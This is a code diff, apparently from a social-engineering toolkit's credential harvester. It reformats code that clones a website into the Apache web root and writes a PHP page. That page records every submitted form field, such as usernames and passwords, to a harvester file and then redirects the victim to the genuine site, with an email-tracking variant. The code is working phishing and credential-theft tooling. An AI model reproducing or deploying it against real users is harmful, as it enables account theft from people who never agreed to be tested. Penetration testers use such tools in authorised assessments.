@@ -506,8 +506,7 @@ def run():
         filewrite = open("%s/post.php" % (apache_dir), "w")
         now = str(datetime.datetime.today())
         harvester_file = ("harvester_" + now + ".txt")
-        filewrite.write(
-            """<?php $file = '%s';file_put_contents($file, print_r($_POST, true), FILE_APPEND); \n/* If you are just seeing plain text you need to install php5 for apache apt-get install libapache2-mod-php5 */ ?><meta http-equiv="refresh" content="0; url=%s" />\n""" % (harvester_file, RAW_URL))
+        filewrite.write("""<?php $file = '%s';file_put_contents($file, print_r($_POST, true), FILE_APPEND); \n/* If you are just seeing plain text you need to install php5 for apache apt-get install libapache2-mod-php5 */ ?><meta http-equiv="refresh" content="0; url=%s" />\n""" % (harvester_file, RAW_URL))
         filewrite.close()
         if os.path.isdir("/var/www/html"):
             logpath = ("/var/www/html")
@@ -518,11 +517,9 @@ def run():
 
         # Check sys platform to perform chown
         if sys.platform == "darwin":
-            subprocess.Popen("chown _www:_www '%s/%s'" %
-                             (logpath, harvester_file), shell=True).wait()
+            subprocess.Popen("chown _www:_www '%s/%s'" % (logpath, harvester_file), shell=True).wait()
         else:
-            subprocess.Popen("chown www-data:www-data '%s/%s'" %
-                             (logpath, harvester_file), shell=True).wait()
+            subprocess.Popen("chown www-data:www-data '%s/%s'" % (logpath, harvester_file), shell=True).wait()
 
         # if we are using webjacking, etc.
         if os.path.isfile(userconfigpath + "web_clone/index2.html"):
@@ -530,8 +527,7 @@ def run():
             if os.path.isfile(apache_dir + "/index2.html"):
                 os.remove(apache_dir + "/index2.html")
 
-            shutil.copyfile(userconfigpath + "web_clone/index2.html",
-                            apache_dir + "/index2.html")
+            shutil.copyfile(userconfigpath + "web_clone/index2.html", apache_dir + "/index2.html")
 
         # here we specify if we are tracking users and such
         if track_email == True:
@@ -549,16 +545,11 @@ def run():
             # Without this only index.php|html are copied even though the user
             # may have chosen to import the entire directory in the set module.
             copyfolder(userconfigpath + "web_clone", apache_dir)
-        if os.path.isfile("%s/index.html" % (apache_dir)):
-            os.remove("%s/index.html" % (apache_dir))
-        if track_email == False:
-            shutil.copyfile(userconfigpath + "web_clone/index.html",
-                            "%s/index.html" % (apache_dir))
+        if os.path.isfile("%s/index.html" % (apache_dir)): os.remove("%s/index.html" % (apache_dir))
+        if track_email == False: shutil.copyfile(userconfigpath + "web_clone/index.html", "%s/index.html" % (apache_dir))
         if track_email == True:
-            shutil.copyfile(userconfigpath + "web_clone/index.html",
-                            "%s/index.php" % (apache_dir))
-            print_status(
-                "NOTE: The URL to click on is index.php NOT index.html with track emails.")
+            shutil.copyfile(userconfigpath + "web_clone/index.html", "%s/index.php" % (apache_dir))
+            print_status("NOTE: The URL to click on is index.php NOT index.html with track emails.")
         print_status("All files have been copied to %s" % (apache_dir))
         if attack_vector != 'multiattack':
             try:
